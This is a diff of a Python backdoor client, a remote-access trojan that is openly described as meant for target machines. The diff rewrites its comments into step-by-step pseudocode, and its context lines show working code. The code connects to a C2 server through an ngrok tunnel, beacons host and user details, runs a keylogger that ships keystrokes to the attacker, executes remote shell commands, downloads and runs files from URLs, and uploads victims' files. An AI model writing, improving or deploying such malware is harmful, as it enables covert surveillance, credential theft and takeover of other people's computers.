@@ -1,6 +1,7 @@
 """
-design@asij
-
+This is the backdoor client that will be deployed on target machines. It connects to a C2 server, executes commands, 
+and can perform keylogging, file upload/download, and shell command execution. The client will attempt to maintain 
+persistence by reconnecting if the connection is lost.
 """
 
 import getpass
@@ -24,9 +25,16 @@ keyBuffer = "" # String to store keystrokes for keylogging
 loggerIsRunning = False # Stores whether the keylogger is working (will be used to stop the keylogger)
 
 
-# Handles the connection of the client to the C2 server through the socket library and tcp server. 
-# Preconditions: Valid address and socket, ngrok tcp port is open
-# Postconditions: Machine is connected to the C2 server, handler thread is wokring, the machine sends its information via send_beacon
+# Handles the connection of the client to the C2 server through the socket library and tcp server.
+# Preconditions: address and port are set, ngrok tcp tunnel is active, and outbound network access is available.
+# Postconditions: When connected, sends a beacon and current working directory, then starts command handling.
+# Pseudocode:
+# 1. Loop forever
+# 2. Create a TCP socket
+# 3. Connect to the listener at (address, port)
+# 4. Send beacon and current working directory
+# 5. Spawn command handler thread, wait for it to finish
+# 6. On exception, wait 10 seconds and retry
 def connect_client():
   global glbSock
   # Infinite loop to keep trying to connect to the server
@@ -47,9 +55,12 @@ def connect_client():
       # Delay for 10 sec
       time.sleep(10)
 
-# Sends the current information of the machine to the listener/user. 
-# Precondtions: Valid socket
-# Postconditions: output is encoded into bytes and sent through the socket
+# Sends the current machine and user information to the listener.
+# Preconditions: sock is an open and connected socket.
+# Postconditions: Beacon message is encoded and sent over the socket.
+# Pseudocode:
+# 1. Format node name, username, privilege, and OS into a beacon string
+# 2. Send the beacon string over sock
 def send_beacon(sock):
   beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
   sock.send(beacon.encode("utf-8"))
@@ -58,13 +69,14 @@ def send_beacon(sock):
 ### Keylogger functions
 ###
 
-# Helper for pynput keylogging, writes the keystrokes to a file in the current working directory of the user.
-# Handles AttributeError by writing "SP: "
-# This function is called to store the keystrokes in a string, then sends it back to the user every 100
-# characters. After sending, the keyBuffer is cleared for the next 100 characters.
-# Preconditions: Valid key input, pynput library correctly imported
-# Postconditions: Keystrokes are stored in a string and sent back to the user every 100 characters, 
-# keyBuffer is cleared after sending.
+# pynput callback for each keypress event.
+# Preconditions: pynput keyboard listener is running, loggerIsRunning indicates active logging, and glbSock may be set.
+# Postconditions: The key is added to the buffer, and when the buffer reaches 100 characters, it is sent to the listener.
+# Pseudocode:
+# 1. If logging is disabled, clear the buffer and return
+# 2. Append character or special key placeholder to keyBuffer
+# 3. If buffer length >= 100 and socket exists, send KEYLOG data and reset buffer
+# 4. On send failure, reset buffer to avoid stale data
 def on_press(key):
     global keyBuffer, glbSock, loggerIsRunning
     
@@ -86,9 +98,13 @@ def on_press(key):
       except:
         keyBuffer = ""
 
-# Activates the keylogger while storing the sock as global sock and updating the logger status. 
-# Preconditions: Valid socket, pynput library correctly imported
-# Postconditions: Keylogger is activated and keystrokes are sent back to the user
+# Activates the pynput keylogger and updates global socket and logger state.
+# Preconditions: sock is a connected socket and pynput is available.
+# Postconditions: keyboard.Listener starts and sends keystrokes back over the socket until stopped.
+# Pseudocode:
+# 1. Store sock in glbSock
+# 2. Set loggerIsRunning to True
+# 3. Start the pynput keyboard listener and block until it stops
 def start_keylogger(sock):
   #updates sock again before using on_press && loggerIsRunning is set to True
   global glbSock, loggerIsRunning
@@ -102,12 +118,15 @@ def start_keylogger(sock):
 ### Shell command function
 ###
 
-# Executes the command based off of the command that is decoded and sends it back through the specified socket by looking through whether
-# the command is a cd command, which goes through a different process due to possible child process change. Other terminal commands will 
-# go through the same process (differentiating between mac and windows). After, the output is then encoded into bytes from string, then into 
-# base 64 for reliability.
-# Preconditions: The command input requires a decoded command (non empty string) and sock, socket is valid
-# Postconditions: The command is executed and the output is sent back to the user 
+# Executes a received shell command or directory change and sends the result back to the listener.
+# Preconditions: command is a non-empty decoded string and sock is a connected socket.
+# Postconditions: Sends CMD_RES with base64 output or CMD_ERR if execution fails.
+# Pseudocode:
+# 1. If command starts with "cd ", change directory and prepare a result string
+# 2. Otherwise run the command in PowerShell on Windows or shell on other systems
+# 3. Capture stdout/stderr and replace empty output with a placeholder
+# 4. Encode result in base64 and send CMD_RES
+# 5. Handle timeouts and execution exceptions
 def execute_command(command, sock):
     try:
     
@@ -145,9 +164,15 @@ def execute_command(command, sock):
 ### File download and upload functions
 ###
 
-# Downloads a file from the specified URL and executes it on the target machine. 
-# Preconditions: Valid URL and socket is inputted from command_handler, and the URL is accessible and points to a valid file
-# Postconditions: The file is downloaded and executed on the target machine, output or equivalent is sent back
+# Downloads a file from the specified URL and optionally executes it on the target machine.
+# Preconditions: full_cmd contains a valid URL and sock is a connected socket.
+# Postconditions: File is saved to the current working directory, and if requested, executed and status messages are sent back.
+# Pseudocode:
+# 1. Parse URL and check for "-e" flag
+# 2. Download file to current directory
+# 3. Send FILE_OK when download completes
+# 4. If execute_after is True, launch the file and send EXEC_OK or EXEC_ERR
+# 5. On failure, send FILE_ERR
 def download_execute(full_cmd, sock):
   try:
     # Split command to check for -e flag
@@ -184,9 +209,14 @@ def download_execute(full_cmd, sock):
     print(f"[!] {error_msg}")
     sock.send(f"FILE_ERR|{error_msg}".encode("utf-8"))
 
-# Uploads a file from the target machine to the client's machine.
-# Preconditions: Valid filename and socket is inputted from command_handler, and the file exists on the target machine
-# Postconditions: The file is uploaded to the client's machine, output or equivalent is sent back to the user
+# Uploads a local file from the target machine back to the listener.
+# Preconditions: filename points to an existing file and sock is a connected socket.
+# Postconditions: Sends UPLOAD_DATA with file contents or UPLOAD_ERR if the file is missing or cannot be read.
+# Pseudocode:
+# 1. Build the full file path from the current working directory
+# 2. Verify the file exists
+# 3. Read the file contents as text and send the upload packet
+# 4. Handle read/send errors and notify listener
 def upload_file(filename, sock):
   try:
     full_path = os.path.join(os.getcwd(), filename)
@@ -216,11 +246,18 @@ def upload_file(filename, sock):
 ### Command Handler
 ###
 
-# Handles the command that is received by the user/listener. Using data to collect the input of the user, this function handles the 
-# tranasition between the user and the function execute)command) through reformatting of the input. If there is an error, it
-# prints it.
-# Preconditions: Valid specified socket, libraries correctly imported
-# Postconditions: execute_command is functioning or the print statement is printed
+# Handles commands received from the listener and dispatches them to the appropriate action.
+# Preconditions: sock is a connected socket and required libraries are imported.
+# Postconditions: KEYLOG, DOWNLOAD, UPLOAD, and shell commands are handled; disconnects when the socket closes.
+# Pseudocode:
+# 1. Loop and read data from sock
+# 2. Decode the received command
+# 3. If command is KEYLOG_START, begin keylogging
+# 4. If command is KEYLOG_STOP, stop keylogging
+# 5. If command starts with DOWNLOAD:, call download_execute
+# 6. If command starts with UPLOAD:, call upload_file
+# 7. Otherwise execute as a shell command
+# 8. On exception, print error and break the loop
 def command_handler(sock):
   global loggerIsRunning
   while True:
